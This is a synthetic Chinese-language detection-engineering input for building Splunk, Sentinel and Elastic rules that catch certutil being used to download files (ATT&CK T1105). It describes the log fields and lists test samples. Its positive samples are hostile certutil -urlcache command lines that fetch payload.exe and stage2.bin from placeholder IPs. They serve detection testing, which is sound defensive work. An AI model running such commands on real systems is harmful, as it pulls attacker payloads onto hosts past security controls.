<!-- 合成样例，非真实数据。所有 IP、哈希、域名均为虚构。 -->

# 检测工程端到端样例输入：certutil 下载绕过检测

## 检测需求

**威胁描述**：攻击者使用 Windows 内置工具 `certutil.exe` 的 `-urlcache -split -f` 参数从外部 URL 下载可执行文件，绕过部分安全控制（LoLBAS 技术）。

**ATT&CK 技术**：T1105 Ingress Tool Transfer（ATT&CK v19）

**目标平台**：
1. Splunk（Enterprise）
2. Microsoft Sentinel / Defender XDR
3. Elastic（EQL）

## 客户日志说明

```
可用日志类型:
- Windows Security Log（EVID 4688）- process_creation
- Sysmon（Event ID 1）- process_creation，含完整命令行
- 字段保留期: 30 天

关键字段（Sysmon/EDR 格式）:
- Image: 进程完整路径（如 C:\Windows\System32\certutil.exe）
- CommandLine: 完整命令行
- ParentImage: 父进程路径
- User: 执行账号

Splunk 字段映射（已提供）:
- Sysmon Event 1 → sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
- Image → Image（原始字段名）
- CommandLine → CommandLine（原始字段名）
```

## 正样本（用于测试规则是否命中）

```
样本 P-01:
CommandLine: certutil -urlcache -split -f http://198.51.100.99/payload.exe payload.exe
Image: C:\Windows\System32\certutil.exe
ParentImage: C:\Windows\System32\cmd.exe

样本 P-02（大小写变体）:
CommandLine: CERTUTIL.EXE -URLCACHE -SPLIT -F https://198.51.100.99/stage2.bin c:\temp\stage2.bin
Image: C:\Windows\System32\certutil.exe
ParentImage: C:\Windows\System32\powershell.exe

样本 P-03（路径不含目录）:
CommandLine: certutil -urlcache -f http://198.51.100.100/update.exe
Image: C:\Windows\SysWOW64\certutil.exe
ParentImage: C:\Windows\System32\cmd.exe
```

## 负样本（正常业务使用，规则不应命中）

```
样本 N-01（证书验证，无下载参数）:
CommandLine: certutil -verify -urlfetch cert.p7b
Image: C:\Windows\System32\certutil.exe
ParentImage: C:\Windows\System32\cmd.exe

样本 N-02（导出证书，无 urlcache）:
CommandLine: certutil -exportPFX -p password My cert.pfx
Image: C:\Windows\System32\certutil.exe
ParentImage: C:\Program Files\ConfigMgr\ccmexec.exe

样本 N-03（显示 CRL，无下载）:
CommandLine: certutil -crl
Image: C:\Windows\System32\certutil.exe
ParentImage: C:\Windows\System32\cmd.exe
```

## 边界样本

```
样本 B-01（IT 运营人员合理下载补丁，父进程为管理工具）:
CommandLine: certutil -urlcache -split -f https://download.example-corp.com/patch.msi patch.msi
Image: C:\Windows\System32\certutil.exe
ParentImage: C:\Program Files\ITManagement\rmm-agent.exe
备注: 这条样本是否应该命中？取决于客户策略；此处视为边界样本（建议由客户决定是否添加父进程过滤）
```
